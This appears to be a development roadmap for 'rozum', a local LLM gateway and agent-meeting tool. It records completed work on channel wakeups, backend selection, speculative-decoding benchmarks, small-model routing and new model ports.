- [x] **agent-principal + resolution** — DONE. New `meeting::agent_identity`: per-session Agent
  principal keyed by `$CLAUDE_CODE_SESSION_ID` (env-stable; no tty; shell env doesn't persist → disk).
  `run_meetings_post` resolves `--as`/`$ROZUM_MEETING_AS` → Agent principal (this session) → human —
  no mixing. Name assigned ONCE (`hello <name>`; idempotent re-hello keeps it; mint fallback). Live
  validated: whoami before/after, idempotency keeps the name, principal persisted. 80 meeting tests green.
- [x] **meetings hello / whoami / who** — DONE. `hello [name]` establishes (once) + emits the terminal-
  title OSC; `whoami` says agent-vs-human; `who` = roster `handle → live/age/cwd-worktree` (+ the human),
  so a meeting handle maps to a findable session.
- [x] **human-display cleanup** — DONE. `identity::display_name` (used by `room.rs::display_for` to
  write the transcript author label) now returns the **identity name** — `Sergiy`/`sunny-civet`, not
  `Sergiy · plucky-fox` — falling back to the minted handle only for an un-named client. The handle
  stays internal (uniqueness). Takes effect on the next daemon restart (the roster stores base+handle
  separately, recomputed live → existing participants get clean labels too). 80 meeting tests green.
- [x] **auto-hello at startup** — DONE (instruction). `AGENTS.md` now tells every agent: first thing in
  a session, `rozum meetings hello <your-handle>` — so it posts as itself, not the operator. (The
  operator does nothing; agents follow AGENTS.md at startup. A daemon-side auto-mint-on-join is a
  possible further nicety but the instruction is the reliable, universal mechanism for CLI agents.)

#### channel-wakeup — push room events into idle agent sessions

Turn `rozum mcp-proxy` into a one-way Claude Code **channel** so a joined-but-idle
agent gets woken when a message lands in its room, instead of relying on the agent
to keep long-polling `meeting.wait_my_turn`. The proxy already holds a
`Peer<RoleServer>` to the agent session (`upstream_peer`); it declares the
`claude/channel` capability and a background task pushes `notifications/claude/channel`
with the new transcript delta. `wait_my_turn` stays as the authoritative pull path.

Empirically verified (CC 2.1.172): channels register fine under rozum's
local-gateway env (auth gate is Bedrock/Vertex/Foundry-only, not custom base URL),
but **only in the interactive `claude` CLI** — headless `-p`/Agent-SDK gets no
channel. `rozum launch … claude` is interactive, so it's on the right path.

Spec: `docs/specs/channel-wakeup.md`. rmcp 1.7 confirmed to support both pieces
(`ServerCapabilities.experimental` map + `ServerNotification::CustomNotification`).

> **NOTE 2026-06-18:** channel-wakeup was originally built in the legacy `proxy.rs`, but
> the P4 daemon refactor made `daemon_proxy.rs` the **default** `rozum mcp-proxy` (legacy
> behind `ROZUM_LEGACY_PROXY=1`), stranding the whole feature (Tier-1 capability/pusher AND
> the Tier-3 piggyback writer) on the unused legacy path. All three items below are now
> **DONE by porting the mechanism into `daemon_proxy.rs`**, adapted to its disk-read
> architecture (`feature/channel-wakeup-daemon-proxy`).

- [x] channel-wakeup-capability - **DONE.** `daemon_proxy.rs` `initialize` now captures the
  session `upstream_peer`, advertises `experimental:{"claude/channel":{}}`
  (`channel_capabilities()`), and `PROXY_INSTRUCTIONS` teaches the agent to read
  `<channel source="rozum" …>` events as a wakeup (authoritative delta via `wait_my_turn`).
- [x] channel-wakeup-pusher - **DONE.** A per-session background task (`ensure_wakeup_task`,
  started at `initialize`) **disk-tails** the joined room (`store::read_since` from the
  proxy's `room_root` — read-only, no second daemon connection, no ghost participant, fits
  the daemon's "clients read disk directly" contract) and emits `notifications/claude/channel`
  (`content` = `render_stored_delta`, `meta` = `{room,from,seq,your_turn}`) on the peer.
  Fire-and-forget; a send/read failure never crashes the proxy. Also carries the **Tier-3
  piggyback** append (was likewise stranded on legacy), auto-off when channels are active.
- [x] channel-wakeup-lifecycle - **DONE.** The task idles when `room_root` is `None` (after
  `leave`) and **re-primes on a room switch** (`rooms.join` re-points `room_root`/`self_pid`/
  `room_name`); teardown = process exit (stdio server). De-dups own-authored turns by
  `participant_id` (`self_pid`); primes the cursor to the transcript head (`transcript_head`)
  and advances it past delivered entries (`read_since` is inclusive of `n`, so it tracks
  *next-n*) — no backlog/reconnect notification storm. Bonus: `rooms.join` now also refreshes
  the proxy's disk-read `room_root` (a latent stale-room bug for `wait_my_turn` after a switch).
  4 new unit tests (render skip-own/format/seq, all-own→none, capability+instructions declared,
  transcript_head primes-past-backlog + delivers-fresh). 387 fast tests green.
- [x] channel-wakeup-launch-flag - `rozum launch` injects
  `--dangerously-load-development-channels server:rozum` for Claude Code agents
  (suppressible; CC ≥ 2.1.80; non-`claude` programs untouched). **DONE** —
  `ChannelWakeup::flags_for` probes `claude --help` and appends the flag (else
  degrades silently); `--no-channel-wakeup` suppresses, `--channel-mcp-name`
  sets the `server:<name>`; threaded through `exec_agent` /
  `exec_agent_anthropic` for both the shared and `--dedicated`/`--no-model`
  paths. (The struct + CLI flags pre-existed but were unwired — see runtime-config
  build fix.) The remaining channel-wakeup items (capability/pusher/lifecycle)
  are still open.

- [x] launch-backend-url-flag - **DONE (`feature/mlx-server-backend`).** `rozum launch
  --backend-url <URL>` — CLI equivalent of `ROZUM_BACKEND_URL` for pointing the agent
  at an external OpenAI-compatible server (Ollama `http://localhost:11434/v1`, vLLM,
  any `/v1`). **Forces** that backend (skips the local GGUF/MLX chain) via a dedicated
  in-process path `run_launch_url` — no shared daemon, no model load; `--model` carries
  the upstream model name (e.g. `qwen3:8b`), required (errors if omitted). Conflicts with
  `--no-model`; registered in `reorder_launch_args` (value flag). Builds
  `OpenAiHttpBackend` directly + serves the lightweight gateway, dies with the agent like
  `--dedicated`. Unit test `backend_url_value_flag_hoisted_from_after_program`. SPEC.md
  updated.

- [x] mlx-server-backend-optional - **DONE (`feature/mlx-server-backend`).** Restored
  the Python `mlx_lm.server` HTTP backend (retired in Phase 4) as **opt-in**, no cargo
  feature (HTTP backends are always compiled — just `reqwest`). `try_mlx_server`
  (`openai_http.rs`) probes `ROZUM_MLX_HTTP` (default `http://localhost:8080/v1`).
  Auto-chain step 4b runs it **only when `ROZUM_MLX_HTTP` is set** (so its port isn't
  probed otherwise), between LM Studio and the custom-URL step. Forceable via
  `--backend mlx-server` (aliases `mlx_lm_server`/`mlx-lm-server`; `mlx`/`mlx_lm` still
  force native MLX) — routed through `is_mlx_server_engine` in `build_gateway_backend_forced`
  + `build_choice`. Restored the `print_no_backend_hints` lines + SPEC.md chain. Unit
  test `backend_engine_tests::mlx_server_engine_aliases_are_distinct_from_native_mlx`.

#### rozum-native-channels — Anthropic-independent wakeup ladder

Spec: `docs/specs/rozum-native-channels.md`. Own the meeting wakeup end-to-end so
it doesn't *depend* on Claude Code's research-preview channels (Tier 1). Tier 2 =
the `wait_my_turn` long-poll contract (done, docs-only). Tier 3 = gateway
piggyback for agents that take neither.

- [x] rozum-native-channels-tier3 - **DONE (`feature/piggyback-wakeup`).** Tier-3
  gateway piggyback, keyed by **project + agent name**. New `src/meeting/piggyback.rs`:
  drop file at `$XDG_RUNTIME_DIR/rozum/piggyback/<project>/<agent>.log` (sibling of
  room sockets). **Writer:** the mcp-proxy channel pusher (`src/meeting/proxy.rs`)
  also `append`s each rendered transcript delta when `piggyback::enabled()` — rides
  the long-poll it already holds, no new room read. **Reader:** the launch-local
  HTTP proxy (`src/proxy.rs` `maybe_inject_room_activity`) drains the project's
  drops once per request (after fingerprinting, so injected room text never
  perturbs the poison id) and folds them into an out-of-band system note —
  prepended to Anthropic `/v1/messages` `system` or as an OpenAI
  `/v1/chat/completions` `system` message; tool JSON / SSE framing untouched,
  non-chat paths zero-touch. Drain is rename-then-read (no lost lines on a racing
  append) and only fires once injection is guaranteed (no loss on a parse miss).
  Caps: 4 KiB/injection, 16 KiB drop-file tail. **Piggyback is the fallback rung:
  auto-OFF when Tier-1 channels are active for the agent** (it would otherwise
  double-deliver — channel event *and* injected note), **ON otherwise**; force off
  with `--no-piggyback`, force on with `ROZUM_PIGGYBACK=1` (`resolve_piggyback`
  precedence: flag > env > auto). `WakeupPolicy::resolve` probes the Tier-1 flags
  once (`flags_for` spawns `claude --version` + prints) and drives both ends:
  threads the bool into the launch-local proxy reader (`ProxyState::with_piggyback`
  / `serve(.., piggyback)` — a disabled launch never drains, not even a stale drop
  file) and exports `ROZUM_PIGGYBACK=1|0` to the agent so the mcp-proxy writer
  agrees. 9 unit tests (append/drain round-trip + coalesce + caps + render + both
  inject shapes + zero-touch-when-disabled + `resolve_piggyback` precedence).
  Reaches Codex/aider/opencode/older-Claude at their next inference call (not a true
  idle wake). Build order item 2 in the spec.

- [x] runtime-config - Load backend policy and backend list from `rozum.toml`.
  - `src/config.rs`: `RuntimeConfig` (serde + `toml`) resolved from `$ROZUM_CONFIG`
    → `./rozum.toml` → `$XDG_CONFIG_HOME/rozum/rozum.toml`; malformed / missing-explicit
    is a hard error. `single` / `fallback` / `fanout` policies; every engine name
    accepted (`gguf`/`mistralrs`/`lmstudio`/`mlx`/`url` + the sync `hello`/`candle`/
    `llama-gguf`/`native-rust`/`external-command`).
  - `default()` IS the auto-detect chain in code (`[gguf, mistralrs, lmstudio, mlx, url]`,
    `Fallback`) → zero behaviour change without a `rozum.toml`. The daemon's initial
    load + every `gateway switch` now walk it (`main.rs::build_from_config`); `--backend`
    still force-bypasses. `[runtime].model`/`n_ctx` fill in when `--model`/`--n-ctx`
    omitted; per-backend `url`/`model`/`n_ctx` override.
  - 12 unit tests (Metal-free); lib suite 101 passing. Also fixed a stray
    `channel-wakeup` build break swept into the gateway-switch commit (separate fix
    commit, which also completed the `channel-wakeup-launch-flag` mechanism).
    Spec: `docs/specs/runtime-config.md`. **DONE.**

### Qwen3.6 unblocking track (three escalating upstream fixes)

Ordered cheapest → most strategic. Pick up the first one that lands; downstream
ones still pay off long-term but the user-facing Qwen3.6 problem is solved as
soon as any single track succeeds.

- [x] llamacpp-qwen36-patch - SUPERSEDED by mlx-native-runtime (Qwen3.6 solved on the native MLX path). Upstream PR to llama.cpp accepting `qwen35moe.rope.dimension_sections` length 3.
  - Single hyperparam loader fix (~50 LoC). Concrete error logged with Qwen3.6 GGUF from `unsloth/Qwen3.6-35B-A3B-GGUF`.
  - Patched llama.cpp → patched llama-cpp-2 version bump → `cargo update` in rozum and `--features gguf` works for Qwen3.6.
  - Estimated effort: ~1 week active + upstream review cycle.
  - Spec: `docs/specs/llamacpp-qwen36-patch.md`.

- [x] mistralrs-qwen36-pr - SUPERSEDED by mlx-native-runtime (Qwen3.6 solved). Upstream PR to mistralrs registering Qwen3.5/3.6 as an alias of the existing `qwen3_next` model.
  - Discovery: mistralrs already has all the hybrid linear-attention layer code in `qwen3_next.rs` (GatedDeltaNet, full-attention, SparseMoeBlock, MoE routing). mlx-lm's `qwen3_5.py` re-uses `qwen3_next.py` classes verbatim — same architecture.
  - The PR is therefore not new layer code; it's: (a) register `model_type: "qwen3_5_moe"` and `architectures: ["Qwen3_5MoeForConditionalGeneration"]` to dispatch to the existing `Qwen3NextLoader`; (b) tolerate the nested `text_config` block + explicit `layer_types` array in the config parser; (c) handle `attn_output_gate` if it changes behaviour.
  - Correctness gate: byte-for-byte token match against `mlx_lm.generate --temp 0`.
  - Highest-leverage: every Rust project that uses mistralrs picks up Qwen3.5/3.6.
  - Estimated effort: ~1 week active (down from 2-3 weeks after the qwen3_next discovery).
  - Spec: `docs/specs/mistralrs-qwen36-pr.md`.

- [x] mlx-native-port - SUPERSEDED by mlx-native-runtime (built on oxideai/mlx-lm crate; see P0 section above). Native MLX runtime in rozum on top of `mlx-rs`, porting `mlx_lm` Python piece by piece.
  - Phased: Phase 0 (bootstrap) → Phase 1 (Qwen3-4B dense) → Phase 2 (Qwen3 MoE) → Phase 3 (Qwen3.6 hybrid). Each phase has a numerical-match exit criterion.
  - Removes our dependency on mistralrs / llama-cpp-2 release cycles entirely; new model families become ~3-5 day port tasks instead of "wait for upstream".
  - New crate feature `mlx-native` (off by default — heavy compile, big code surface).
  - Estimated effort: ~5-8 calendar weeks for parity with current mistralrs scope.
  - Spec: `docs/specs/mlx-native-port.md`.

### Small-model utility track (P2) — where 4B/7B earn their keep

> Motivation (from the 2026-06-16 agentic matrix): small models (Qwen3-4B,
> Qwen2.5-Coder-7B) are NOT viable autonomous coders — they pass `greet` and the
> occasional one-line edit but fail multi-step `build`/`test`. They ARE fast
> (~8 GB, high tok/s) and fine for narrow single-shot work. Two concrete roles:

- [x] spec-decode-draft - **Speculative decoding: P0+P1 DONE, verdict: off-by-default (net-negative on MoE target). Stays opt-in via `--draft-model`.** Spec: `docs/specs/speculative-decoding.md`.
  - A small model (e.g. `Qwen3-4B-4bit`) proposes k tokens; the big target
    (e.g. `Qwen3.6-35B-A3B-4bit`) verifies them in one forward and accepts the
    longest correct prefix. Net: fewer big-model forwards → faster decode with
    **byte-identical greedy output** (the whole point — it's not a quality
    tradeoff, it's a latency win).
  - **Architecture (грамотно, per spec):** NOT a hack in the MLX loop. An
    **engine-agnostic orchestrator above the SPI** (`src/specdecode.rs`,
    accept-longest-prefix loop, byte-identical invariant **unit-tested with a mock
    target** — no real model) + a small opt-in `SpeculativeVerify` capability a
    backend implements (`prefill`/`verify`+KV-rollback). Draft + target are two
    **residents**; device-aware placement (draft cheap device, target fast) —
    the canonical heterogeneous single-stream co-use (`multi-device-residency.md`,
    North Star). MLX implements the capability for dense targets first; GGUF later.
  - Caveats to design around: the hybrid Qwen3.6 GatedDeltaNet recurrent state is
    not freely truncatable (`HybridPrefix`) — rollback on rejected drafts is the
    hard part; **dense-target first**, hybrid degrades to plain greedy. Draft +
    target must share a tokenizer (Qwen3 family ✓; enforced).
  - Acceptance: `--draft-model <spec>` (or env) → greedy output **identical** to
    non-draft + a measured tok/s speedup on a real dense target. Effort: LARGE.
  - **P0 DONE** (`src/specdecode.rs`, 3 tests, branch `feature/spec-decode`): the
    engine-agnostic orchestrator (`Draft`/`Target` traits + `decode()`/`decode_streaming()`,
    accept-longest-greedy-prefix) with the **byte-identical invariant proven with
    a mock target** (oracle/all-wrong/flaky drafts all yield the exact target
    greedy seq; oracle ~len/(k+1) forwards vs all-wrong's len).
  - **P1 DONE — built, proven, matrix-gated; verdict: net-negative on the
    recommended MoE model** (branch `feature/spec-decode-p1`, commits
    `02e2ecd`/`a0ed496`/`eeb8487`). iter-1 = `--draft-model` flag + SPI
    `SpecDecodeBackend` (target-only fallback). iter-2 = MLX **dense** verify
    (multi-pos forward → per-row argmax → accept-longest-greedy-prefix →
    KV-truncate-to-accepted) + propose, on the existing `dense_forward` /
    `ConcatKeyValueCache.truncate` / `argmax`; proven on Metal by
    `mlx_spec_decode_byte_identical`. iter-3 = dual-model worker
    (`MlxNativeBackend::new_spec_decode`, both models one worker, orchestrator runs
    inside) streaming via `BatchSeq` + chunked prefill so a 30B target doesn't OOM;
    gateway auto-detects an MLX-dense pair (`build_spec_decode_backend`).
  - **MATRIX RESULT (M4, claude × Qwen3-30B-A3B + Qwen3-4B draft):** correctness
    gate **PASSED** (pass-matrix identical off-vs-on, no quality regression); speed
    gate **FAILED on this target** — spec-decode 34.8 t/s vs 98.1 baseline (2.8×
    *slower*) despite 2.65× fewer target forwards. **Why (structural, not a bug):**
    (1) the 30B-A3B target is **MoE** — a `k+1`-token verify forward loads more
    distinct experts, so per-forward cost scales with tokens and cancels the
    forward-count win (spec-decode needs a *dense*, bandwidth-bound target whose
    forward cost is flat in token count); (2) the 4B dense draft (124 t/s) is no
    cheaper than the MoE target (98 t/s) — the draft must be ≥5–10× cheaper.
    **Verdict:** correct + valuable durable infra (North Star: dense /
    heterogeneous-device single-stream co-use), stays **off by default** (opt-in
    `--draft-model`); a win only for a slow large *dense* target + tiny draft, which
    isn't among the cached/recommended M4 models. Full numbers + reasoning in the
    spec "Results". Float-tie caveat: byte-identical in exact arithmetic; on Metal,
    identical modulo rare argmax ties (verify batches positions → KV built in a
    different shape than sequential decode) — `mlx_spec_decode_byte_identical`
    asserts the mechanism (lcp), the matrix asserts functional equivalence.

- [x] small-model-router-rag - **Small model as router / classifier / RAG worker.
  DONE — all P1+P2 shipped** (`src/router.rs`, branches `feature/small-model-router`
  + `feature/small-model-rag-worker`).
  - Use a 4B/Coder-7B for the narrow, single-shot, latency-sensitive steps that
    don't need a big model: intent/query classification, model-or-tool routing
    (cheap pre-filter before invoking 27B+), RAG chunk rerank + summarize,
    structured-field extraction. Builds on what's already here — `src/rag_lite.rs`
    and `src/memory_store.rs`.
  - Where: a small routing/classification entrypoint the gateway (or `rozum
    launch`) can call before/around the main model; reuse `rag_lite` for retrieval.
  - **P1 DONE:** `ModelRouter` classifier primitive — caller-supplied `Label` set,
    engine-agnostic over any `ChatBackend` (mirrors `cascade::ModelJudge`), never
    errors (`snap_to_label` snaps a noisy reply to a label; off-set/failure →
    fallback). 8 hardware-free unit tests + **M4 eval `model_router_eval` 6/6 =
    100%** on Qwen3-4B (code/math/chitchat), all exact matches — well above the
    0.80 gate-the-big-model bar. Plain prompt+snap sufficed (no constrained decode
    needed). Spec: `docs/specs/small-model-router.md`.
  - **P2 cascade wiring DONE** (`src/cascade/{mod,spec}.rs`): `ModelRouter` is the
    cascade's optional async model-backed difficulty source.
    `ModelRouter::difficulty` (over `router::difficulty_labels()` trivial/moderate/
    hard) → `CascadeConfig.router` drives the entry tier for `ClassifyThenStart`/
    `Learned` (skipped under `AlwaysCheapest`; sync `Classifier` trait untouched).
    Reachable from config: `CascadeSpec.router_model` resolved in `build_cascade`
    (→ `model:"cascade:<name>"` + `router_model` in `rozum.toml`/`ROZUM_CASCADE`).
    4 new tests (router routes hard→top / trivial→cheapest; router_model resolved+
    threaded; JSON round-trip). 366 fast tests green.
  - **P2 RAG worker DONE 2026-06-18** (`src/router.rs` `RagWorker`): same
    `ModelRouter` shape over `rag_lite::Hit`s. `rerank(query, hits)` judges each hit
    `relevant`/`related`/`irrelevant` (via `snap_to_label`), **drops** irrelevant +
    reorders relevant-first with a **stable** sort (refines BM25 recall, never
    scrambles within a grade); a model fumble keeps the hit as `related` (conservative
    — never silently drop). `summarize(query, hits)` answers grounded **only** in the
    survivors, falls back to the top snippet on a blank/failed generation.
    `rerank_and_summarize` / `grounded_answer(retriever, query, k)` compose the two
    with `rag_lite` recall → `GroundedAnswer { hits, summary }`. 7 hardware-free unit
    tests (drop+grade-order, stable-within-grade, off-set→keep, summary
    empty/fallback/passthrough, `grounded_answer` e2e) + `#[ignore]` M4 eval
    `rag_worker_eval` (4B drops a lexical decoy, ranks the answering doc first, grounds
    the summary). 373 fast tests green. **This closes the small-model-router track**
    (classifier P1, cascade wiring P2, RAG worker P2). Composes with
    [[small-model-cascade]] (the after-the-fact escalation counterpart).

- [x] small-model-cascade - **Single-shot bounded tasks served small-first, escalate on
  doubt. DONE 2026-06-18** (`src/cascade/tasks.rs`, branch `feature/small-model-cascade`).
  Spec: `docs/specs/small-model-cascade.md`. A **thin preset over the cascade core** (one
  `AcceptanceCheck` gate + a two-tier config builder + a prompt helper — no new engine):
  - `SmallTask::CommitMessage` + `small_task_config(task, small, big)` → a two-tier
    `CascadeConfig` (`small`=tier 0, `big`=tier 1, `AlwaysCheapest`, acceptance =
    `[StructuralCheck, <task gate>]`, self-signal + affordance off — the task has a concrete
    validator, not a self-report). Health/backoff/budget/stats/lanes inherited from cascade.
  - `CommitMessageGate` (free, deterministic): extract the subject (first non-empty line,
    fence/quote/heading stripped) → `ESCALATE` on empty / over-72-char / refusal / chatter
    preamble / `<placeholder>`, else `ACCEPT`; never `Inconclusive`. False-positive-safe
    ("Fix commit message parser crash" accepts). `commit_message_request(diff)` builds the
    tight gate-shaped prompt.
  - **10 fast tests, all green** (no model): gate accept/escalate cases + e2e over a real
    `CascadeBackend` with mock backends — good cheap answer accepts at tier 0 (**big never
    called**), junk escalates once, and a **small-tier hit-rate** batch (small passes 3/4 →
    big called exactly once). 383 fast tests green. Generalizes [[small-model-router-rag]]
    (routing decides up-front; the cascade decides after a cheap attempt).
  - **CLI wiring DONE 2026-06-18:** `rozum commit-msg [--model <spec[,spec2]>]` (`src/main.rs`)
    reads `git diff --cached` → `commit_message_request` → prints. Single `--model` generates
    directly; a `small,big` list builds the `small_task_config` cascade (small answers, gate
    escalates). Defaults to `[runtime].model`. `staged_diff_in` unit-tested in a temp git repo.
  - **Follow-ups (deferred):** process-gated task types (`OneLineFix` via `cargo check`,
    `Rename` via build/lint — gate trait supports it, not hermetically testable); a remote big
    tier for `commit-msg` (v1 treats both tiers as local).

### Model bringup track (catalog) — new architectures to get working

> Suggested 2026-06-16. Both need investigation + fiddling before they serve
> cleanly. Bringup workflow per model: pick the MLX checkpoint → check
> `supported_model_type` (`src/mlx_native_backend.rs`) and `config.json`
> `model_type` → if unknown arch, port it (else just register) → numerical-parity
> gate vs `mlx_lm` (`scripts/mlx_ref.py`) → add to the catalog (`src/models.rs`) →
> verify tool-call parse/format (`src/serving.rs` / `src/constrain.rs`).

- [x] gpt-oss-20b-bringup - **DONE 2026-06-17 (native port, merged to master).** Chose
  path (b): added the `gpt_oss` arch to mlx-native — MXFP4 experts (`gather_qmm` mode),
  attention sinks, alternating sliding/full attention, YaRN rope, mixed per-leaf quant
  (8-bit router), clamped SwiGLU. Byte-exact greedy parity vs Python `mlx_lm`. Full
  **harmony** adapter (`src/harmony.rs`): clean chat + single/multi-turn tool calls.
  **claude 5/5** on the agentic matrix (= the 35B) after fixing 3 OUR bugs (greedy-CoT
  loops → temp floor; parser dropped recipient-on-wrong-channel calls; no prefix reuse).
  In `src/models.rs`. Fork pushed + pinned. Memory: [[project-gptoss-native-port]].

- [x] qwen4-coder-bringup - **DONE 2026-06-17 = `Qwen3-Coder-30B-A3B-Instruct-4bit`.**
  `model_type: qwen3_moe` → routes through the EXISTING path; **byte-exact greedy
  parity** vs Python `mlx_lm` (`s.chars().rev().collect::<String>()`). Tool calls
  parse (XML `<function=…>` form). Needed TWO small fixes: (1) the checkpoint
  quantizes the MoE router (`mlp.gate`) at **8-bit** while the rest is 4-bit — added
  per-tensor router-bits handling to the fork's `qwen3_moe` loader (pre-quantize the
  gate at its own bits; backward-compatible). (2) its chat template does
  `tools | length` / `tools is defined` → pass an empty `[]` for no-tools (not null),
  in `tools_json` (matches transformers; truthiness-guarded templates unaffected —
  gpt-oss regression-checked). Added to `src/models.rs`. Fork rev bumped to e5ebe9d2.

- [x] glm4-bringup — **DONE.** Port GLM-4 (dense) to the MLX-native crate:
  add `.vendor/mlx-lm/mlx-lm/src/models/glm4.rs` + register in `models/mod.rs` + dispatch
  `"glm4" => glm4::load_glm4_model(dir)` in `src/mlx_native_backend.rs`. Same playbook as
  [[project-gptoss-native-port]]: byte-exact greedy parity vs Python `mlx_lm.glm4`
  (`scripts/mlx_ref.py`), then catalog (`src/models.rs`) + tool-call verify. Targets that fit
  36 GB: **GLM-4-9B** (fast bring-up) → **GLM-4-32B-0414** (dense; 4-bit ~18–20 GB, the real
  target, ≈ Qwen3.6-27B footprint). Building blocks ALREADY in the crate to reuse: **partial
  RoPE** (`qwen3_5`/`qwen3_5_moe` — GLM's distinctive `partial_rotary_factor`), **q/k/v bias**
  (`qwen3`), **post-attention / sandwich norm** (`qwen3`/`gemma3`). NEW work = GLM **weight-name
  remap** (the gpt-oss "garbage bug" risk — get q/k/v/o/gate/up/down/norm names exact) + the
  GLM **chat template** (`[gMASK]<sop>` + `<|user|>`/`<|assistant|>`). Quick "does it run at
  all" path meanwhile: the vendored **mistral.rs already has `Glm4ForCausalLM` /
  `Glm4MoeForCausalLM` loaders** → `ROZUM_FORCE_MISTRALRS=1 rozum launch --model <glm-4-9b>`
  (candle/Metal — works but ~5–10× slower per [[project-mistralrs-mlx-direct]]; validation
  only, the real path is the MLX-native port for speed). OUT OF SCOPE for 36 GB (too big — for
  the record): the MoE GLMs — **GLM-4.5-Air** (106B-A12B), **GLM-4.5** (355B), and **GLM-5 /
  GLM-5.1** (744B-A44B MoE, 256 experts/8 active, DeepSeek sparse attention, 200K ctx,
  released 2026-02-11) — GLM-5 ≈ 370 GB at 4-bit; cluster-scale, not local. See BACKLOG
  `glm-model-landscape`.

### Runtime / backend track — new engines below the `ChatBackend` seam

- [x] x86-native-slot - **DONE 2026-06-18 — the empty x86 slot, scaffolded so the real engine
  drops in without rework** (`src/x86/`, branch `feature/x86-native-slot`). Compiles on any host
  (no Vulkan deps yet), so the **default CI keeps the contract honest**. Contents: `X86NativeOptions`,
  `X86NativeBackend` (`impl ChatBackend`, errors with a self-documenting `NOT_IMPLEMENTED`),
  `try_build_x86_backend` (logs + falls through until built), and **`X86Engine` (`impl
  crate::engine::LocalEngine`) — a second `LocalEngine` implementor that proves the token-level seam
  fits a non-MLX engine** (the native-engine-spi validation, no hardware needed). The five compact
  components are pre-shaped stub files with their contract + the test to write
  (`device`/`memory`/`tensor`/`kernels`/`model`). Wired + reachable: `engine="x86-native"` (aliases
  `x86`/`vulkan`) in `config.rs::ACCEPTED_ENGINES` + a `main.rs::build_choice` arm (NOT in the
  default auto-chain). `Cargo.toml` reserves the `x86-native` feature for the future Vulkan binding.
  3 slot tests (default sane, falls-through-until-built, chat errors clearly). 379 fast tests green.
  **To fill:** add the Vulkan dep under the feature + implement the component bodies (P0–P5) + wire
  `chat` through `engine::drive` (native-engine-spi A3, shaped against this real consumer). Spec:
  `docs/specs/x86-native-runtime.md` § "Status: SLOT SCAFFOLDED".

### Done

- [x] lmstudio-http-backend - Auto-detect LM Studio's local OpenAI-compatible server at `http://localhost:1234/v1`.
  - Unlocks Qwen3.6 (and any LM Studio MLX model) on Apple Silicon today, ahead of in-process mistralrs AFQ work.
  - Inserts above `mlx_lm.server` in the `build_gateway_backend` priority chain.
  - Reuses the existing `OpenAiHttpBackend` SSE parser; no new dependencies.
  - Env: `ROZUM_LMSTUDIO_HTTP=http://host:port/v1` to override the default endpoint.
  - Spec: `docs/specs/lmstudio-http-backend.md`.

- [x] idle-cpu-reduction - Event-driven TUI / room loops; ~0% CPU when idle.
  - Spec: `docs/specs/idle-cpu-reduction.md`.

- [x] chat-backend-spi - Async streaming `ChatBackend` trait with tool-use, sampling params, cancel; replaces the old sync `InferenceBackend`.
  - Content blocks (`Text` / `ToolUse` / `ToolResult`) in the SPI from day 1.
  - Helper `collect_to_string` for meeting call-sites that still need a final `String`.
  - `BackendOrchestrator` (Single / Fallback / FanOut) rewritten on async streams.
  - Spec: `docs/specs/chat-backend-spi.md`.

- [x] gguf-backend - In-process GGUF inference on Metal via llama-cpp-2.
  - Crate feature `gguf`. Path resolvers for absolute paths, `lmstudio:<repo>`, and Ollama-cached tags (`<name>[:<tag>]`, reading `~/.ollama/models/blobs/` without a running daemon).
  - Streaming, per-token cancel, prompt-cache by `session_id`, Qwen-hermes tool-use parser.
  - Spec: `docs/specs/gguf-backend.md`.

- [x] mistralrs-backend - In-process native-MLX backend via the `mistralrs` crate (on by default).
  - Loads MLX safetensors directly: `mlx-community:<repo>`, `hf:<user>/<repo>`, or local directory. Auto-download via `hf-hub`.
  - Streaming token-by-token; per-token cancel; reuses `crate::gguf::ToolUseParser` for tool calls.
  - Spec: `docs/specs/mistralrs-backend.md`.

- [x] api-gateway - Outward HTTP gateway exposing both OpenAI and Anthropic dialects on `127.0.0.1`.
  - `GET /v1/models`, `POST /v1/chat/completions` (OpenAI SSE with `tool_calls`), `POST /v1/messages` (Anthropic event-stream with `tool_use` blocks).
  - Context-overflow → HTTP 400 with a clear error. Cancel propagates from client disconnect.
  - Optional bearer auth via `ROZUM_GATEWAY_TOKEN`. Bind always `127.0.0.1`.
  - Spec: `docs/specs/api-gateway.md`.

- [x] launch-wrapper - `rozum launch --model X <program>` starts the gateway and execs the agent CLI with `ANTHROPIC_*` / `OPENAI_*` env vars pre-set.
  - Uses `ANTHROPIC_AUTH_TOKEN` (rank-2 in Claude Code auth precedence) so the local model wins without `claude /logout`.
  - Sets `ANTHROPIC_MODEL` + the four `ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU}_MODEL` slots so Claude Code starts on the local model without a manual `/model` pick.
  - Enables `CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY=1` so the model shows up in the `/model` picker with `display_name`.
  - Argument reordering pre-parser accepts both `--model X claude` and `claude --model X`; `--` separator forwards remaining args verbatim.
  - Spec: `docs/specs/launch-wrapper.md`.

- [x] launch-no-model - `rozum launch --no-model <program>` runs the agent with no
  local model against upstream Anthropic: no gateway/lease/proxy, no `ANTHROPIC_*`/
  `OPENAI_*` overrides, operator's own auth preserved; only rozum agent-context
  defaults applied. Picker lists "Anthropic (cloud — no local model)" first.
  `LaunchTarget::{Local,Anthropic}`; `--no-model` conflicts with `--model`/
  `--dedicated`/`--n-ctx`/`--port`, reordered like value flags. Unlocks channels
  (real Anthropic auth) for rozum-launched agents. Spec: `docs/specs/launch-wrapper.md`. **DONE.**

- [x] models-cli - `rozum models {list, list --remote, info <spec>}` for discovering and inspecting local LLM models.
  - Scans HuggingFace hub, Ollama (both monolithic GGUF and per-tensor MLX layouts), and LMStudio caches without needing those runtimes running.
  - `list --remote` prints a curated download list optimised for 24-36 GB Apple Silicon unified memory.
  - `info <spec>` fetches HuggingFace metadata for not-installed models (author, downloads, license, total size, tags) and prints the install command.

### Cancelled / Superseded

These were in the queue earlier but either landed as part of larger work or no longer match the current product direction.

- [x] meeting-cli-surface — done as part of the current CLI shape: bare `rozum` launches a meeting, `rozum list` / `rozum mcp-proxy` are present, and the only user-facing model commands are `rozum gateway / launch / models`. No standalone "model diagnostics" CLI was ever shipped. Spec: `docs/specs/optional-local-models.md`.

- [x] agent-meetings — implemented as the default `rozum` runtime + `rozum mcp-proxy`. Claude Code / Codex sessions join via the MCP proxy and a human participates through the TUI. Moderator modes, budget, and hotkeys live in `src/meeting/`. Spec: `docs/specs/agent-meetings*.md`.

